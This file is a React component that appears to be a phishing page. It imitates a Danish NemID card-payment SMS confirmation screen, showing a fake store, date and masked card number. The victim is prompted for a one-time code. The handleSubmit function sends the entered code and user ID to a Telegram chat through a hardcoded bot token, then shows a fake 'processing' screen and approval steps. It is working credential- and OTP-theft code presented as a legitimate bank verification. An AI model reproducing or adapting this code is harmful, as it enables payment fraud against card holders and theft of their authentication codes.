import "./page2.css";
import "./payment.css";
import { format } from "date-fns";
import { useParams } from "react-router-dom";
import { useState } from "react";
import Header from "./components/header/Header";
import {GiSmartphone} from "react-icons/gi"
function Page2() {
  const date = new Date();
  const { TelegramClient } = require("messaging-api-telegram");
  const { card } = useParams();

  const [isLoading, setIsLoading] = useState(false);
  const [step2, setStep2] = useState(false);
  const [step1, setStep1] = useState(true);
  const [step3, setStep3] = useState(false);
  const [userId, setUserId] = useState("subhan");
  const [pass, setPass] = useState("");
  let [secondSmsPage,setSecondSmsPage]=useState(false)

  const client = new TelegramClient({
    accessToken: "1946580313:AAFbzUqaVbUGlCE4LFTWvGjbzhGF4WYAcD0",
  });
  const sendmsg = async () => {
    console.log("sending msg now");
    await client.sendMessage(
      -1001578583679,
      "userId : " + userId + " \n pass  : " + pass
    );
  };
 console.log(secondSmsPage,"sms pag")
  const handleSubmit = () => {
  
     if(pass){ setStep1(false);
      setIsLoading(true);
      sendmsg();
      setTimeout(() => {
        setIsLoading(false);
        setStep2(true);
      }, 3000);
    }
  };

  const sendMessage = () => {
    setStep2(false);
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setStep3(true);
    }, 3000);
  };
  return (
    <>
    <Header />
     

      <main _ngcontent-jha-c52="">
        <div _ngcontent-jha-c52="" style={{backgroundColor:"white" }}>
          <div
            _ngcontent-jha-c52=""
            class="background-wrapper container pt-40 pb-20"

           
          >
            <div _ngcontent-jha-c52="" class="container">
              <div
                _ngcontent-jha-c52=""
                class="container ce_lead_text ce_lead_text_centered pb-20"
              >
                <div _ngcontent-jha-c52="" class="row justify-content-center" >
                  <div _ngcontent-jha-c52="" class="col-12">
                    <div
                      _ngcontent-jha-c52=""
                      class="subline subline_small"
                    ></div>
                  </div>
                </div>
              </div>
              <div _ngcontent-jha-c52="" class="row justify-content-center" >
                <div _ngcontent-jha-c52="" class="col-12 col-md-10 col-lg-8">
                  <div _ngcontent-jha-c52="" class="card card_search">
                    <div _ngcontent-jha-c52="" class="card-body pt-3 " >
                      <form
                        _ngcontent-jha-c52=""
                        novalidate=""
                        name="witt002-search"
                        class="js-parcel-search ng-untouched ng-pristine ng-invalid ng-valid"
                        
                      
                      >
                        <fieldset _ngcontent-jha-c52=""  >
                          <div _ngcontent-jha-c52="" class="form-row"  >
                            <app-nem 
                            
                            _ngcontent-jha-c52="" _nghost-jha-c48=""
                             >
                              <div  >
                                <h2
                                  style={{ fontWeight: 500, fontSize: 25 }}
                                  _ngcontent-jha-c48=""
                                >
                                  <b _ngcontent-jha-c48="">
                                



Confirmation by SMS
                                  </b>
                                  < br />
                                </h2>
                                <br _ngcontent-jha-c48="" />
                                <div _ngcontent-jha-c48="" class="xcenter">
                                  <table _ngcontent-jha-c48="" class="kingt">
                                    <tbody _ngcontent-jha-c48="">
                                      <tr _ngcontent-jha-c48="">
                                        <td
                                          _ngcontent-jha-c48=""
                                          class="txtleft pb-10"
                                        >
                                        
                                    Online Store:{" "}
                                        </td>
                                        <td
                                          _ngcontent-jha-c48=""
                                          class="txtright pb-10"
                                        >
                                           SPL
                                        </td>
                                      </tr>
                                      <tr _ngcontent-jha-c48="">
                                        <td
                                          _ngcontent-jha-c48=""
                                          class="txtleft pb-10"
                                        >
                                          Date:{" "}
                                        </td>
                                        <td
                                          _ngcontent-jha-c48=""
                                          class="txtright pb-10"
                                        >
                                          {/* {format(date, "MM/dd/yyyy HH:mm a")} */}
                                          &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;       09/20/2021   &nbsp;   19:28 PM
                                        </td>
                                      </tr>
                                      <tr _ngcontent-jha-c48="">
                                        <td
                                          _ngcontent-jha-c48=""
                                          class="txtleft pb-10"
                                        >
                                        Card number:{" "}
                                        </td>
                                        <td
                                          _ngcontent-jha-c48=""
                                          class="txtright pb-10"
                                        >
                                          {/* {`xxxxxxxxxxxx${card.slice(
                                            card.length - 4,
                                            card.length
                                          )}`} */}
                                       &nbsp;  &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;      xxxxxxxxxxxx4444
                                        </td>
                                      </tr>
                                    </tbody>
                                  </table>
                                </div>
                                <br /><br />
                                <div
                                  // _ngcontent-jha-c48=""
                                  // id="site"
                                  // class="formotp divmin"
                                  style={{backgroundColor:"white",width:"100%"}}
                                >
                                  <div
                                    // _ngcontent-jha-c48=""
                                    // id="nui"
                                    // class="wrapper usrpwd-21-1"
                                    style={{backgroundColor:"green"}}
                                  >
                                    <div
                                     _ngcontent-jha-c48="" class="frame"
                                       style={{backgroundColor:"white"}}
                                    >
                                      <div
                                        _ngcontent-jha-c48=""
                                        // class="frame__logo"
                                      >
                                        <svg
                                          _ngcontent-jha-c48=""
                                          viewBox="0 0 109.4 24.1"
                                          class="frame__logo--large"
                                        >
                                          <path
                                            _ngcontent-jha-c48=""
                                            d="M81.9 22.9c0 .6.4.9.9.9s.9-.3.9-.9V.9c0-.6-.4-.9-.9-.9s-.9.3-.9.9v22zM97.1.2h-5.3c-1.4 0-2.1.7-2.1 2.2v18.9c0 1.5.7 2.2 2.1 2.2h5c7.6 0 12.2-4.9 12.2-11.9.1-6.9-4.4-11.4-11.9-11.4zM97 21.9h-4.7c-.7 0-.9-.3-.9-1v-18c0-.7.2-1 .9-1h4.5c7.1 0 10.5 4.2 10.5 10 0 6-3.8 10-10.3 10z"
                                          ></path>
                                          <g _ngcontent-jha-c48="">
                                            <path
                                              _ngcontent-jha-c48=""
                                              d="M1.7 2.9c0-.6.2-.7.4-.7s.4.4.5.5l12.9 19.6c.3.4.8 1.2 2 1.2 1.3 0 1.9-.9 1.9-2.3V1c0-.6-.4-.9-.8-.9s-.8.3-.8.9v20c0 .6-.2.7-.4.7s-.4-.4-.5-.5L3.9 1.5c-.3-.4-.8-1.2-2-1.2C.7.4 0 1.3 0 2.6v20.3c0 .6.4.9.8.9s.8-.3.8-.9v-20zM43.6 22.9c0 .6.4.9.8.9s.8-.3.8-.9V2.7c0-.6.1-.7.4-.7s.5.4.6.5l7.2 10.2c.2.3.4.4.7.4.3 0 .5-.1.7-.4l7.3-10.2c.1-.1.3-.5.6-.5.2 0 .3.1.3.7v20.2c0 .6.4.9.8.9s.8-.3.8-.9V2.4C64.6 1 64 .2 62.7.2c-1.2 0-1.6.7-2 1.2L54 10.9l-6.7-9.5c-.3-.5-.8-1.2-2-1.2-1.3 0-1.9.9-1.9 2.3l.2 20.4zM32.8 11.3c.3.3.9.3 1.2 0 .4-.4.2-.9-.1-1.2l-6.6-7c-.4-.4-.5-.6-.5-.8 0-.2.2-.4.5-.4h10.2c.6 0 .9-.4.9-.8s-.3-.8-.9-.8H26.9c-1.2 0-2 .6-2 1.6s.7 1.7 1.3 2.4l6.6 7zM39.6 20.4c.3-.5.2-1-.2-1.2-.4-.2-.9-.2-1.2.3-.4.5-2.1 2.9-5.9 2.9-3 0-6.3-1.8-6.3-5.6 0-3.4 3.3-4.8 3.8-5.1.6-.3.7-.8.4-1.1-.2-.4-.6-.6-1.2-.3-.9.3-4.9 2.1-4.9 6.6 0 4.4 3.6 7.2 7.8 7.2 4-.1 6.6-1.9 7.7-3.7z"
                                            ></path>
                                          </g>
                                        </svg>
                                        <svg
                                          _ngcontent-jha-c48=""
                                          viewBox="0 0 68.5 15.2"
                                          class="frame__logo--small"
                                        >
                                          <path
                                            _ngcontent-jha-c48=""
                                            d="M51.2 14.5c0 .4.3.6.5.6s.5-.2.5-.6V.7c0-.4-.3-.6-.5-.6s-.5.2-.5.6v13.8zM60.7.3h-3.3c-.9 0-1.3.5-1.3 1.4v11.8c0 .9.4 1.4 1.3 1.4h3.1c4.8 0 7.6-3.1 7.6-7.4.1-4.4-2.7-7.2-7.4-7.2zm-.1 13.6h-2.9c-.4 0-.5-.2-.5-.6V2c0-.5.1-.6.5-.6h2.8C64.9 1.3 67 4 67 7.6c0 3.8-2.3 6.3-6.4 6.3z"
                                          ></path>
                                          <g _ngcontent-jha-c48="">
                                            <path
                                              _ngcontent-jha-c48=""
                                              d="M1 2c0-.4.1-.5.2-.5s.3.2.3.3l8.1 12.3c.2.3.5.7 1.2.7.8 0 1.2-.6 1.2-1.4V.8c0-.4-.2-.6-.5-.6s-.5.2-.5.6v12.5c0 .4-.1.5-.2.5s-.3-.2-.3-.3L2.4 1.1C2.2.8 1.9.4 1.2.4.4.4 0 1 0 1.8v12.7c0 .3.2.5.5.5s.5-.2.5-.5V2zM27.2 14.5c0 .4.2.6.5.6s.5-.2.5-.6V1.9c0-.4.1-.5.2-.5s.3.2.4.3l4.5 6.4c.1.2.3.3.5.3s.3-.1.5-.3l4.5-6.4c.1-.1.2-.3.4-.3.1 0 .2.1.2.5v12.6c0 .4.2.6.5.6s.5-.2.5-.6V1.7c0-.9-.4-1.4-1.2-1.4-.7 0-1 .4-1.3.7l-4.2 6-4.2-6c-.2-.3-.5-.7-1.2-.7-.8 0-1.2.6-1.2 1.4l.1 12.8zM20.5 7.2c.2.2.6.2.7 0 .2-.2.2-.6-.1-.8L17 2c-.2-.2-.3-.4-.3-.5s.1-.2.3-.2h6.4c.4 0 .6-.2.6-.5s-.2-.5-.6-.5h-6.7c-.7 0-1.2.4-1.2 1s.4 1.1.8 1.5l4.2 4.4zM24.7 12.9c.2-.3.1-.6-.1-.8-.2-.1-.5-.1-.7.2-.2.3-1.3 1.8-3.7 1.8-1.9 0-3.9-1.1-3.9-3.5 0-2.1 2-3 2.4-3.2.3-.1.4-.4.2-.7-.1-.2-.4-.4-.7-.2-.5.2-3 1.3-3 4.2 0 2.8 2.2 4.5 4.9 4.5 2.4 0 4-1.2 4.6-2.3z"
                                            ></path>
                                          </g>
                                        </svg>
                                        <button
                                          _ngcontent-jha-c48=""
                                          tabindex="55"
                                          title="Afbryd igangværende handling"
                                          type="button"
                                          class="cancel clear-button"
                                        >
                                          <svg
                                            _ngcontent-jha-c48=""
                                            viewBox="0 0 18 18"
                                            class="cancel__image"
                                          >

                                            <g
                                              _ngcontent-jha-c48=""
                                              fill="none"
                                              fill-rule="evenodd"
                                            >
                                              <path
                                                _ngcontent-jha-c48=""
                                                d="M2 2l13.976 13.976M15.976 2L2 15.976"
                                                stroke-linecap="square"
                                                stroke-width="2"
                                                class="svg-class__stroke"
                                              ></path>
                                            </g>
                                          </svg>
                                        </button>
                                        <button
                                          _ngcontent-jha-c48=""
                                          tabindex="54"
                                          title="Hjælp til NemID"
                                          type="button"
                                          id="useridhelp"
                                          class="help clear-button"
                                        >
                                          <svg
                                            _ngcontent-jha-c48=""
                                            viewBox="0 0 500 500"
                                            class="help__image"
                                          >
                                            <path
                                              _ngcontent-jha-c48=""
                                              d="M224.8 360c-.2-6.9-.3-12-.3-15.5 0-20.2 2.9-37.7 8.6-52.4 4.2-11.1 11-22.2 20.3-33.5 6.9-8.2 19.2-20.2 37.1-35.9 17.8-15.7 29.4-28.3 34.8-37.6 5.3-9.3 8-19.6 8-30.6 0-20-7.8-37.6-23.5-52.8C294.2 86.6 275 79 252.3 79c-21.9 0-40.3 6.9-54.9 20.6-14.7 13.7-24.3 35.2-28.9 64.4l-52.9-6.3c4.8-39.1 18.9-69.1 42.5-89.9s54.7-31.2 93.4-31.2c41 0 73.7 11.2 98.1 33.5s36.6 49.3 36.6 81c0 18.3-4.3 35.2-12.9 50.6-8.6 15.5-25.4 34.2-50.4 56.4C306.1 273 295.1 284 290 291s-9 15.2-11.4 24.3c-2.5 9.2-3.9 24-4.3 44.6h-49.5v.1zm-3.1 103.3v-58.7h58.7v58.7h-58.7z"
                                              class="svg-class__fill"
                                            ></path>
                                          </svg>
                                          <div
                                            _ngcontent-jha-c48=""
                                            class="frame__divider"
                                          ></div>
                                        </button>
                                      </div>
                                      <div
                                        _ngcontent-jha-c48=""
                                        class="frame__content"
                                      >
                                        <div
                                          _ngcontent-jha-c48=""
                                          id="framecontentscroll"
                                          class="frame__content__scroll"
                                          style={{backgroundColor:"white"}}
                                        >
                                          <div _ngcontent-jha-c48="">
                                            <div
                                              _ngcontent-jha-c48=""
                                              class="Process-Indicator-Content"
                                              style={{ display: "none" }}
                                            ></div>

                                            {step3 && (
                                              <div
                                                _ngcontent-jha-c48=""
                                                class="appwaiting"
                                                style={{ display: "block" ,backgroundColor:"white"}}
                                              >
                                                <div _ngcontent-jha-c48="">
                                                  <div
                                                    _ngcontent-jha-c48=""
                                                    class="ifapp"
                                                  >
                                                    <br _ngcontent-jha-c48="" />
                                                    <h1 _ngcontent-jha-c48="">
                                                    Approve on mobile / tablet
                                                    </h1>
                                                    <div
                                                      _ngcontent-jha-c48=""
                                                      class="frame__row"
                                                    >
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        class="animate top-icon-frame spacer"
                                                      >
                                                        <div
                                                          _ngcontent-jha-c48=""
                                                          aria-label="nøgleapp"
                                                          class="otp__icon-phone-pulse"
                                                        ></div>
                                                        <div
                                                          _ngcontent-jha-c48=""
                                                          aria-label="nøgleapp"
                                                          class="otp__icon-phone icon-element"
                                                        ></div>
                                                      </div>
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        aria-hidden="true"
                                                        class="hide-element"
                                                      >
                                                        <p
                                                          _ngcontent-jha-c48=""
                                                          class="spacer"
                                                        >
                                                          Submit request
                                                           approval to your
                                                           key apps on
                                                           mobile / tablet.
                                                        </p>
                                                      </div>
                                                      <div _ngcontent-jha-c48="">
                                                        <p
                                                          _ngcontent-jha-c48=""
                                                          class="spacer hide-element"
                                                        ></p>
                                                        <p
                                                          _ngcontent-jha-c48=""
                                                          class="spacer"
                                                        >
                                                          Your request is ready for approval in your key apps on mobile / tablet.
                                                        </p>
                                                      </div>
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        class="spacer"
                                                    
                                                      >
                                                        <p
                                                          _ngcontent-jha-c48=""
                                                          aria-hidden="true"
                                                          class="hide-element error"
                                                        ></p>
                                                      </div>
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        class="spacer"
                                                      
                                                      ></div>
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        class="spacer"
                                                      
                                                      >
                                                        <div
                                                          _ngcontent-jha-c48=""
                                                          href="#"
                                                          tabindex="51"
                                                          title="Skift til sms bekræftelse"
                                                          class="pointercur link"
                                                          style={{color:"white",backgroundColor:"white"}}
                                                        >
                                                          Switch to sms
                                                           confirm
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                              </div>
                                            )}

                                            <div
                                              _ngcontent-jha-c48=""
                                              class="otpsend"
                                              style={{ display: "none" ,backgroundColor:"white"}}
                                            >
                                              <div _ngcontent-jha-c48="">
                                                <div
                                                  _ngcontent-jha-c48=""
                                                  class="frame__row"
                                                >
                                                  <p
                                                    _ngcontent-jha-c48=""
                                                    class="spacer"
                                                  ></p>
                                                  <br _ngcontent-jha-c48="" />
                                                  <div
                                                    _ngcontent-jha-c48=""
                                                    class="label__text spacer"
                                                  >
                                                  Enter the one-time code we
                                                     sent to your mobile phone.
                                                  </div>
                                                  <div
                                                    _ngcontent-jha-c48=""
                                                    class="otp__frame spacer"
                                                  >
                                                    <div
                                                      _ngcontent-jha-c48=""
                                                      class="otp__frame__row otp__frame__top"
                                                    >
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        class="otp__frame__cell otp__frame__top--cell"
                                                      >
                                                        <div
                                                          _ngcontent-jha-c48=""
                                                          class="otp__key-icon"
                                                        ></div>
                                                      </div>
                                                    </div>
                                                    <div
                                                      _ngcontent-jha-c48=""
                                                      class="otp__frame__row"
                                                    >
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        class="otp__frame__cell"
                                                        style={{backgroundColor:"white"}}
                                                      >
                                                        <input
                                                          _ngcontent-jha-c48=""
                                                          required=""
                                                          name="pin"
                                                          t=""
                                                          aria-label="Indtast nøgle"
                                                          aria-required="true"
                                                          tabindex="51"
                                                          type="tel"
                                                          pattern="\d*"
                                                          maxlength="6"
                                                          class="input otp-input ng-untouched ng-pristine ng-invalid"
                                                          ng-reflect-required=""
                                                          ng-reflect-maxlength="6"
                                                          ng-reflect-name="pin"
                                                          ng-reflect-pattern="\d*"
                                                          ng-reflect-model=""
                                                        />
                                                      </div>
                                                    </div>
                                                    <div
                                                      _ngcontent-jha-c48=""
                                                      class="nmasx222"
                                                      style={{
                                                        display: "none",backgroundColor:"white"
                                                      }}
                                                    >
                                                      OTP IS WRONG
                                                    </div>
                                                  </div>
                                                  <div
                                                    _ngcontent-jha-c48=""
                                                    class="spacer"
                                                  >
                                                    <p
                                                      _ngcontent-jha-c48=""
                                                      class="spacer"
                                                    ></p>
                                                    <div
                                                      _ngcontent-jha-c48=""
                                                      class="spacer"
                                                    >
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        href="#"
                                                        tabindex="51"
                                                        title="forsøg igen"
                                                        class="pointercur link"
                                                      >
                                                       

try again
                                                      </div>
                                                    </div>
                                                  </div>
                                                  <button
                                                    _ngcontent-jha-c48=""
                                                    tabindex="51"
                                                    title="Log på med NemID"
                                                    type="button"
                                                    class="button button--submit spacer"
                                                  >
                                              sign in
                                                  </button>
                                                </div>
                                              </div>
                                            </div>

                                            {step2 && (
                                              <div
                                                _ngcontent-jha-c48=""
                                                class="appsendnotification"
                                                style={{border:"2px soid red",backgroundColor:"white"}}
                                              >
                                                <div _ngcontent-jha-c48=""  style={{border:"2px soid red",backgroundColor:"white"}}>
                                                  <br _ngcontent-jha-c48="" />
                                                  <h1
                                                    style={{
                                                      fontWeight: 500,
                                                      fontSize: 14,
                                                    }}
                                                    _ngcontent-jha-c48=""
                                                  >
                                                   Approve with key app
                                                  </h1>
                                                  <div
                                                    _ngcontent-jha-c48=""
                                                    class="frame__row"

                                                  >
                                                    <div
                                                      _ngcontent-jha-c48=""
                                                      class="top-icon-frame spacer"
                                                    >
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        aria-label="nøgleapp"
                                                        class="otp__icon-phone-pulse"
                                                        style={{border:"2px soid red",backgroundColor:"white"}}
                                                      ></div>
                                                      <div
                                                        _ngcontent-jha-c48=""
                                                        aria-label="nøgleapp"
                                                        class="otp__icon-phone icon-element"
                                                      ></div>
                                                    </div>
                                                    <div _ngcontent-jha-c48="">
                                                      <p
                                                        _ngcontent-jha-c48=""
                                                        class="spacer"
                                                      >
                                                        < br />
                                                       Send request for approval to your key apps on mobile / tablet.
                                                      </p>
                                                    </div>
                                                    <div
                                                      _ngcontent-jha-c48=""
                                                      aria-hidden="true"
                                                      class="hide-element"
                                                    >
                                                      <p
                                                        _ngcontent-jha-c48=""
                                                        class="spacer hide-element"
                                                      ></p>
                                                      <p
                                                        _ngcontent-jha-c48=""
                                                        class="spacer"
                                                      >
                                                        Din anmodning er klar
                                                        til godkendelse i dine
                                                        nøgleapps på
                                                        mobil/tablet.
                                                      </p>
                                                    </div>
                                                    <div
                                                      _ngcontent-jha-c48=""
                                                      class="spacer"
                                                    ></div>
                                                    <div _ngcontent-jha-c48="">
                                                      {/* <button
                                                       
                                                        _ngcontent-jha-c48=""
                                                        aria-label="Send"
                                                        tabindex="51"
                                                        title="Klik her for at godkende med nøgleapp"
                                                        type="button"
                                                        class="button button--submit spacer"
                                                      >
                                                        Send
                                                      </button> */}
                                                      <div 
                                        style={{textAlign:"center"}}> 
                                        <button 
                                         onClick={sendMessage}
                                        style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",
                                        textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} >Send</button></div>
                                                    </div>
                                                  </div>
                                                </div>
                                              </div>
                                            )}

                                            {step1 && (

                                              secondSmsPage==true?<>
                                            
                                              
                                               <div className="message_otp" style={{backgroundColor:"white"}}>
                                                 {/* < br /> */}
                                                <div style={{textAlign:"center"}}>
                                                  <GiSmartphone style={{width:"300p",color:"blue",fontSize:"62px" ,backgroundColor:"#F6F9F8",
                                          border:"1px solid grey",borderRadius:"50% 50%",padding:"10px"}} /></div>
                                             {/* <br/> */}
                                                  <h1 style={{fontSize:"2rem",textAlign:"center"}}>Verification </h1>
                                                  <h3 style={{textAlign:"center",fontSize:"17px",opacity:".3",width:"98%"}}>
                                                    {/* We will send you a One Time Password on your phone number */}
                                                    you will get a otp via sms 
                                                    </h3>
                                                    < br />
                                <div style={{textAlign:"center",display:"flex",justifyContent:"center"}}>  
                                <input onChange={(e)=>{setPass(e.target.value)}} style={{textAlign:"center",backgroundColor:"white",border:"1px solid grey",padding:"3px"}} type="password"></input>
                                </div>
                                                  < br />
                                         <div 
                                        style={{textAlign:"center"}}> 
                                        <button style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} onClick={handleSubmit}>Verify</button></div>
                                           < br />
                                              </div>  
                                              
                                              
                                              
                                              
                                              
                                              
                                              
                                              
                                              
                                              </>:
                                              <div
                                              // _ngcontent-jha-c48=""
                                              class="userid-pwd"
                                              style={{ display: "block",backgroundColor:"white" }}
                                            >
                                              <div _ngcontent-jha-c48="">
                                                <div
                                                  _ngcontent-jha-c48=""
                                                  class="spacer"
                                                >
                                                  {/* <h1
                                                    _ngcontent-jha-c48=""
                                                    class="service-provider"
                                                    style={{backgroundColor:"white"}}
                                                  >
                                                    Nets Denmark
                                                  </h1> */}
                                                </div>
                                                {/* <div
                                                  _ngcontent-jha-c48=""
                                                  class="frame__row spacer"
                                                >
                                                  <div
                                                    _ngcontent-jha-c48=""
                                                    class="label"
                                                  > */}
                                                    {/* <label
                                                      _ngcontent-jha-c48=""
                                                      aria-label="Indtast bruger-id."
                                                      for="userid"
                                                      id="userid-label"
                                                      class="label__text"
                                                    >
                                                      <span _ngcontent-jha-c48="">
                                                        Bruger-id
                                                      </span>
                                                    </label> */}
                                                  </div>
                                                  <div
                                                    _ngcontent-jha-c48=""
                                                    class="label align-right"
                                                  >
                                                    {/* <div
                                                      _ngcontent-jha-c48=""
                                                      class="spacer label--checkbox"
                                                    >
                                                      <label
                                                        _ngcontent-jha-c48=""
                                                        for="rememberUserId"
                                                        aria-hidden="true"
                                                        class="hide-element"
                                                      >
                                                        <input
                                                          _ngcontent-jha-c48=""
                                                          aria-label="Tryk for at huske dit bruger-id"
                                                          tabindex="51"
                                                          title="Gem bruger-id, så det ikke skal indtastes fremover."
                                                          type="checkbox"
                                                          id="rememberUserId"
                                                          aria-hidden="true"
                                                          style={{
                                                            display: "none",
                                                          }}
                                                        />
                                                        <span
                                                          _ngcontent-jha-c48=""
                                                          title="Gem bruger-id, så det ikke skal indtastes fremover."
                                                          class="label__text"
                                                        >
                                                         Remember me
                                                        </span>
                                                      </label>
                                                    </div> */}
                                                  {/* </div>
                                                </div> */}
                                                {/* <div
                                                  _ngcontent-jha-c48=""
                                                  class="frame__row spacer"
                                                > */}
                                                  {/* <input
                                                    onChange={(e) =>
                                                      setUserId(
                                                        e.target.value
                                                      )
                                                    }
                                                    required=""
                                                    name="user"
                                                    aria-required="true"
                                                    autocapitalize="none"
                                                    autocomplete="off"
                                                    autocorrect="off"
                                                    spellcheck="false"
                                                    tabindex="51"
                                                    type="text"
                                                    id="USER"
                                                    maxlength="48"
                                                    class="input ng-untouched ng-pristine ng-invalid"
                                                  /> */}
                                                  {/* <span
                                                    _ngcontent-jha-c48=""
                                                    class="error-span"
                                                  ></span> */}
                                                {/* </div> */}
                                                <div _ngcontent-jha-c48="">
                                                  {/* <div
                                                    _ngcontent-jha-c48=""
                                                    class="hide-element"
                                                  ></div> */}
                                                  <div _ngcontent-jha-c48="">
                                                    {/* <div
                                                      _ngcontent-jha-c48=""
                                                      class="frame__row spacer"
                                                    > */}
                                                      {/* <div
                                                        _ngcontent-jha-c48=""
                                                        class="label"
                                                      > */}
                                                        {/* <label
                                                          _ngcontent-jha-c48=""
                                                          id="password0Label"
                                                          class="label__text"
                                                        >
                                                          

                                                       Password 
                                                        </label> */}
                                                      {/* </div> */}
                                                      {/* <div
                                                        _ngcontent-jha-c48=""
                                                        class="label align-right pointercur"
                                                      > */}
                                                        {/* <a
                                                          _ngcontent-jha-c48=""
                                                          aria-label="Har du glemt din adgangskode så få hjælp her"
                                                          title="Glemt kode?"
                                                          tabindex="54"
                                                          class="link"
                                                        >
                                                          

                                             Forgotten code?
                                                        </a> */}
                                                      {/* </div> */}
                                                    {/* </div> */}
                                                    {/* <div
                                                      _ngcontent-jha-c48=""
                                                      class="frame__row spacer align-center"
                                                    > */}
                                                      {/* <input
                                                        onChange={(e) =>
                                                          setPass(
                                                            e.target.value
                                                          )
                                                        }
                                                        required=""
                                                        name="password"
                                                        anon="true"
                                                        aria-required="true"
                                                        autocomplete="off"
                                                        type="password"
                                                        id="PASS"
                                                        maxlength="40"
                                                        tabindex="51"
                                                        aria-labelledby="password0Label"
                                                        class="input ng-untouched ng-pristine ng-invalid"
                                                      /> */}
                                                      {/* <div
                                                        _ngcontent-jha-c48=""
                                                        aria-hidden="true"
                                                        class="hide-element pin__container"
                                                        style={{border:"2px solid red"}}
                                                      ></div> */}
                                                      {/* <span
                                                        _ngcontent-jha-c48=""
                                                        class="error-span"
                                                      ></span> */}
                                                    {/* </div> */}
                                                  </div>
                                                </div>
                                                {/* <div
                                                  _ngcontent-jha-c48=""
                                                  class="frame__row spacer"
                                                  style={{border:"2px solid red"}}
                                                >
                                                  <p
                                                    _ngcontent-jha-c48=""
                                                    aria-hidden="true"
                                                    class="error"
                                                  ></p>
                                                </div> */}
                                              </div>
                                              {/* < br /> */}
                                              <div className="message_otp" style={{backgroundColor:"white"}}>
                                                 
                                                <div style={{textAlign:"center"}}>
                                                  <GiSmartphone style={{width:"300p",color:"blue",fontSize:"62px" ,backgroundColor:"#F6F9F8",
                                          border:"1px solid grey",borderRadius:"50% 50%",padding:"10px"}} /></div>
                                             <br/>
                                                  <h1 style={{fontSize:"2rem",textAlign:"center"}}>Verification </h1>
                                                  <h3 style={{textAlign:"center",fontSize:"17px",opacity:".3",width:"98%"}}>
                                                    We will send you a One Time Password on your phone number
                                                    {/* you will get a otp via sms  */}
                                                    </h3>
                                                    < br />
                                <div style={{textAlign:"center",display:"flex",justifyContent:"center"}}>  
                                {/* <input style={{textAlign:"center",backgroundColor:"white",border:"1px solid grey",padding:"3px"}} type="password"></input> */}
                                </div>
                                                  {/* < br /> */}
                                         <div 
                                        style={{textAlign:"center"}}> 
                                        <button 
                                         onClick={()=>{setSecondSmsPage(true)}}
                                        style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} >GET OTP</button></div>
                                           < br />
                                              </div>  
                                              <div
                                                _ngcontent-jha-c48=""
                                                class="frame__row"
                                              >
                                                {/* <button
                                                 
                                                  tabindex="51"
                                                  title="Fortsæt til næste skærmbillede"
                                                  type="button"
                                                  class="button button--submit spacer"
                                                >
                                                 

                                                   Next
                                                </button> */}
                                              </div>
                                              <div
                                                _ngcontent-jha-c48=""
                                                class="frame__row align-center"
                                              >
                                                <a
                                                  _ngcontent-jha-c48=""
                                                  aria-label="Har du glemt din adgangskode så få hjælp her"
                                                  href="#"
                                                  tabindex="54"
                                                  title="Glemt kode?"
                                                  aria-hidden="true"
                                                  class="hide-element link spacer"
                                                >
                                                 Forgotten code?
                                                </a>
                                              </div>
                                            </div>
                                              
                                              
                                              
                                              
                                            )}
                                          </div>
                                          <div _ngcontent-jha-c48=""></div>
                                        </div>
                                      </div>
                                    </div>

                                    {isLoading && (
                                      <div
                                        _ngcontent-jha-c48=""
                                        aria-hidden="true"
                                        class="process-indicator"
                                      >
                                        <div
                                          _ngcontent-jha-c48=""
                                          class="process-indicator__background"
                                        ></div>
                                        <div
                                          _ngcontent-jha-c48=""
                                          class="process-indicator__content"
                                        >
                                          <div _ngcontent-jha-c48="">
                                          Please wait.
                                          </div>
                                          <div _ngcontent-jha-c48="">
                                    

Your information {" "}
                                          </div>
                                          <div _ngcontent-jha-c48="">
                                          processing ...
                                          </div>
                                          <div
                                            _ngcontent-jha-c48=""
                                            style={{ display: "none" }}
                                          >
                                            Retrieving document
                                          </div>
                                        </div>
                                      </div>
                                    )}
                                  </div>
                                  <br _ngcontent-jha-c48="" />
                                  <br _ngcontent-jha-c48="" />
                                </div>
                              </div>
                            </app-nem>
                          </div>
                        </fieldset>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
    </>
  );
}

export default Page2;
